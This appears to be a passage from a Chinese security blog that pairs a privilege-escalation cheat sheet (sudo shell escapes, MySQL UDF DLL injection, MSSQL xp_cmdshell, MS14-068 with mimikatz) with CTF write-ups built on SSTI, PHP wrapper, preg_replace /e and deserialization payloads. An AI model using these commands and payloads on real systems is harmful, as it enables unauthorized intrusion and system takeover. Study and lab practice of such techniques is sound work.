<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">less &#x2F;etc&#x2F;passwd</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>awk</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure>



<h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>参考：<a href="https://www.cnblogs.com/sfsec/p/15163907.html">https://www.cnblogs.com/sfsec/p/15163907.html</a></p>
<h1 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h1><h3 id="udf"><a href="#udf" class="headerlink" title="udf"></a>udf</h3><p>原理：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UDF是mysql的一个扩展接口，即扩展mysql的用户自定义函数。用户可以向mysql的udf.dll中添加用户自定义函数（可以执行命令的函数，如sys_eval（）），即可获得system权限。</span><br></pre></td></tr></table></figure>



<p>条件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. mysql用户(root)的密码，（查询，破解hash）</span><br><span class="line">2. secure_file_priv的值为空，具有写入权限，</span><br><span class="line">如果mysql服务器开启了secure-file-priv选项，就只能将文件导出到指定目录下</span><br><span class="line"></span><br><span class="line">dll位置：</span><br><span class="line">mysql版本&gt;&#x3D;5.1 dll文件导入lib\plugin目录</span><br><span class="line">5.0&lt;mysql版本&lt;5.1 dll文件导入c:\windows或者c:\windows\system32目录下</span><br><span class="line"></span><br><span class="line">mysql版本&lt;4.1  任意位置</span><br><span class="line">4.1&lt;&#x3D;mysql版本&lt;5.0</span><br></pre></td></tr></table></figure>




<p>查看mysql的版本</p>
<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/57.png"></p>
<p>查看<code>secure_file_priv</code>的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show global variables like &#39;secure%&#39;;</span><br><span class="line"></span><br><span class="line">当 secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出，此时无法提权</span><br><span class="line"></span><br><span class="line">当 secure_file_priv 的值为 &#x2F;tmp&#x2F; ，表示限制 mysqld 的导入|导出只能发生在 &#x2F;tmp&#x2F; 目录下，此时也无法提权</span><br><span class="line"></span><br><span class="line">当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/58.png"></p>
<p>此处<code>secure_file_priv</code>的值为空，符合提权的要求</p>
<p>查看<code>plugin</code>的目录名称</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;plugin%&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/59.png"></p>
<p>查询目录的绝对路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select @@plugin_dir;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/60.png"></p>
<p>查看系统架构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%compile%&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/61.png"></p>
<p>可以看到该主机是64位的</p>
<p>接下来将udf.dll文件写入plugin目录，并创建函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 0x十六进制内容 into dumpfile &quot;plugin的目录\\udf.dll&quot;</span><br></pre></td></tr></table></figure>

<p>把桌面上的tools文件夹中的udf.txt里面的十六进制内容写入<code>C:\Program Files\MySQL\MySQL Server 5.5\lib\plugin\udf.dll</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 0x4D5A90000300000 ...... into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.5\\lib\\plugin\\udf.dll&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/62.png"></p>
<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/63.png"></p>
<p>成功将udf.dll写入目标路径</p>
<p>导入udf函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function sys_eval returns string soname &#39;udf.dll&#39;;    # 导入sys_eval函数</span><br><span class="line"></span><br><span class="line">select * from mysql.func where name &#x3D; &#39;sys_eval&#39;;   # 查看创建的sys_eval函数</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/64.png"></p>
<p>执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#39;whoami&#39;);</span><br><span class="line"></span><br><span class="line">select sys_eval(&#39;ipconfig&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/65.png"></p>
<p>成功获取system权限</p>
<h3 id="mof"><a href="#mof" class="headerlink" title="mof"></a>mof</h3><h1 id="mssql提权"><a href="#mssql提权" class="headerlink" title="mssql提权"></a>mssql提权</h1><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sp_configure &#39;show advanced options&#39;,1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line">sp_configure &#39;xp_cmdshell&#39;,1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line"></span><br><span class="line">EXEC xp_cmdshell &#39;whoami&#39;;</span><br></pre></td></tr></table></figure>



<h1 id="域内提权"><a href="#域内提权" class="headerlink" title="域内提权"></a>域内提权</h1><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">前提条件：</span><br><span class="line"></span><br><span class="line">域控没有打该漏洞补丁(KB3011780)</span><br><span class="line"></span><br><span class="line">已经获取普通域用户的账户，密码，hash，sid（whoami &#x2F;user）</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用：</span><br><span class="line"></span><br><span class="line">1.mimikatz清除票据</span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">2.ms14-068.exe生成票据</span><br><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr(ip)&gt;</span><br><span class="line"></span><br><span class="line">3.mumukatz导入票据，权限提升为域管</span><br><span class="line">kerberos::ptc &quot;票据文件名&quot;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>One step a day</title>
    <url>/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/</url>
    <content><![CDATA[<h2 id="2020-11-4-SSTI模板注入"><a href="#2020-11-4-SSTI模板注入" class="headerlink" title="2020.11.4-SSTI模板注入"></a>2020.11.4-SSTI模板注入</h2><blockquote>
<h2 id="BJDCTF2020-The-mystery-of-ip-1"><a href="#BJDCTF2020-The-mystery-of-ip-1" class="headerlink" title="[BJDCTF2020]The mystery of ip 1"></a>[BJDCTF2020]The mystery of ip 1</h2></blockquote>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.4/1.png" alt="image-20200926194608129"></p>
<span id="more"></span>

<p>第一眼看到题目就感觉这道题应该不难，问题应该出在IP这个地方。实在不知道怎么写就在网上看了下<a href="https://www.cnblogs.com/wangtanzhi/p/12318630.html">wp</a>,flask框架</p>
<p>以前确实没有见到过**<em>SSTI模板注入**</em></p>
<hr>
<h5 id="知识点理解："><a href="#知识点理解：" class="headerlink" title="知识点理解："></a>知识点理解：</h5><p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.4/4.png" alt="1"></p>
<p>SSTI(Server-Side Template Injection)，即服务端模板注入攻击，恶意构造输入数据，从而造成文件读取或者getshell</p>
<p>一些模板引擎：Smarty，Mako，Jinja2，Jade，Velocity，Freemaker和Twig</p>
<p>拓展：</p>
<p>遇到flask框架反应就是SSTI模板注入</p>
<p><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">浅析SSTI（python沙盒绕过)</a></p>
<p> talmap工具可以实现自动化检测</p>
<hr>
<h5 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h5><p>提示了ip，可能与XFF有关，能修改ip说明可控</p>
<p>经smarty注入payload 测试  ，可控</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;</span><br><span class="line">&#123;if system(&#39;ls&#39;)&#125;&#123;&#x2F;if&#125;</span><br><span class="line">&#123; readfile(&#39;&#x2F;flag&#39;) &#125;</span><br><span class="line">&#123;if show_source(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</span><br><span class="line">&#123;if system(&#39;cat ..&#x2F;..&#x2F;..&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125; #本题payload</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.4/2.png" alt="image-20200926194608129"></p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.4/3.png" alt="image-20200926194608129"></p>
<hr>
<h2 id="2020-11-5-命令执行"><a href="#2020-11-5-命令执行" class="headerlink" title="2020.11.5-命令执行"></a>2020.11.5-命令执行</h2><blockquote>
<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2></blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<!--more-->

<p>爱了爱了，代码审计</p>
<p>出现了file_get_contents()和include()函数,所以我们需要用php伪协议传入<code>text</code>和<code>file</code>的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream&amp;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.5/1.png" alt="2"></p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.5/2.png" alt="1"></p>
<p>进行base64解码得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>？？？</p>
<p>有关 return preg_replace(…)没看懂</p>
<hr>
<h5 id="知识点理解：-1"><a href="#知识点理解：-1" class="headerlink" title="知识点理解："></a>知识点理解：</h5><p>  主要是preg_replace e模式下的代码执行问题.</p>
<p><code> &#39;strtolower(&quot;\\1&quot;)&#39;,</code> 里面的<code>\\1</code>实际就是\1,在正则匹配中即指第一个子匹配项</p>
<p>官方payload：/?.*={${phpinfo}}, </p>
<p><code>/.*=&#123;&#123;&#125;&#125;会变成 /_*</code>是非法字符不为首字母，</p>
<p>所以换个正则表达式   <strong>\S*=${phpinfo()}</strong> 可执行函数</p>
<p><a href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html">正则表达式</a></p>
<p><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></p>
<p><a href="https://blog.csdn.net/satasun/article/details/109456347">参考wp</a></p>
<hr>
<h5 id="解题：-1"><a href="#解题：-1" class="headerlink" title="解题："></a>解题：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\S*&#x3D;$&#123;phpinfo&#125; 或者  \S*&#x3D;&#123;$&#123;phpinfo&#125;&#125;   &#x2F;&#x2F; 可以命令执行</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.5/3.png" alt="4"></p>
<blockquote>
<p>/next.php?S*=${getFlag()}&amp;cmd=system(‘cat /flag’);</p>
</blockquote>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020.11.5/4.png" alt="3"></p>
<hr>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><ul>
<li>2021.5.24</li>
</ul>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.5.24/1.png" alt="1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123; </span><br></pre></td></tr></table></figure>

<p>第一关我们可以通过php 伪协议传参welcome to the zjctf。  php://input  或者   data:// 都可以</p>
<ul>
<li>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include($file);  &#x2F;&#x2F;useless.php </span><br></pre></td></tr></table></figure>

<p>第二关这么明显的提示，我们赶快去读useless.php 内容（在第一关的基础上）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>

<p>获得一串base64加密数据PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=</p>
<p>解密得</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  &#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.5.24/2.png" alt="2"></p>
<p><a href="http://cb05b76c-5a4d-493d-b445-e9e887b65582.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;&amp;file=useless.php&amp;&amp;password=O:4:&quot;Flag&quot;:1:%7Bs:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;%7D">http://cb05b76c-5a4d-493d-b445-e9e887b65582.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;&amp;file=useless.php&amp;&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</a></p>
<p>F12获得flag</p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><ul>
<li>2021.7.21</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I put something in F12 for you</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">$flag&#x3D;&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;</span><br><span class="line">if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">    $gg&#x3D;$_GET[&#39;gg&#39;];</span><br><span class="line">    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;</span><br><span class="line">        echo &#39;You got the first step&#39;;</span><br><span class="line">        if(isset($_POST[&#39;passwd&#39;])) &#123;</span><br><span class="line">            $passwd&#x3D;$_POST[&#39;passwd&#39;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd&#x3D;&#x3D;1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#39;Good Job!&#39;;</span><br><span class="line">                     highlight_file(&#39;flag.php&#39;);</span><br><span class="line">                     die(&#39;By Retr_0&#39;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#39;You can not get it !&#39;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#39;only one way to get the flag&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#39;Please input first&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol>
<li><p><code>md5($id) === md5($gg) &amp;&amp; $id !== $gg</code>   php强比较绕过</p>
</li>
</ol>
<p><code>id[]=1&amp;gg[]=2</code>，传入数组，虽然会报错但md5返回结果为空，NULL=NULL绕过md5，</p>
<ol start="2">
<li>is_numeric()函数用1234567a绕过，1234567a会被当做字符串，转换整型时候把a去掉</li>
</ol>
<p>##[MRCTF2020]套娃1</p>
<ul>
<li>2020.7.21</li>
</ul>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210721161850938.png" alt="image-20210721161850938"></p>
<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>可以获得我们传的参数变量和值，如下解释：</p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210721162009856.png" alt="image-20210721162009856"></p>
<p><code>%20</code>代替<code>_</code>绕过第一个if检测(查询字符串在解析的过程中会将空白符删除或用将某些字符转换为下划线（包括<code>空格</code>，<code>[</code>）)   或者用<code>%5F</code>代替<code>_</code></p>
<p><a href="https://www.freebuf.com/articles/web/213359.html">参考</a></p>
<p><code>%0a</code>绕过第二个正则（超级实用）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?b%20u%20p%20t&#x3D;23333%0a</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723151026286.png" alt="image-20210723151026286"></p>
<p>jsfuck加密</p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723151432092.png" alt="image-20210723151432092"></p>
<p>复制到控制台</p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723151501201.png" alt="image-20210723151501201"></p>
<p>随便post   Merak一个值</p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723160659019.png" alt="image-20210723160659019"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Flag is here~But how to get it? </span><br><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>xff不行，用client-ip:127.0.0.1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?2333&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">todat is a happy day</span><br></pre></td></tr></table></figure>

<p>file 需要写个解密poc</p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210724015309274.png" alt="image-20210724015309274"></p>
<p>file=ZmpdYSZmXGI=</p>
<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210724015407359.png" alt="image-20210724015407359"></p>
<h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><ul>
<li>2020.7.22</li>
</ul>
<p><a href="http://120.25.24.45:30194/show_code.php">http://120.25.24.45:30194/show_code.php</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="string">&#x27;show_code.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">56</span> || <span class="variable">$a</span>&gt;<span class="number">256</span>)&#123;             <span class="comment">#key1</span></span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;真相???&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(chr(<span class="variable">$a</span>)===<span class="string">&quot;8&quot;</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;接着&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag1</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;不太行&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="variable">$b</span>,<span class="string">&#x27;8&#x27;</span>)!==<span class="literal">false</span>)&#123;      <span class="comment">#key2</span></span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;不会那么容易的&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;=<span class="number">1</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">  ++<span 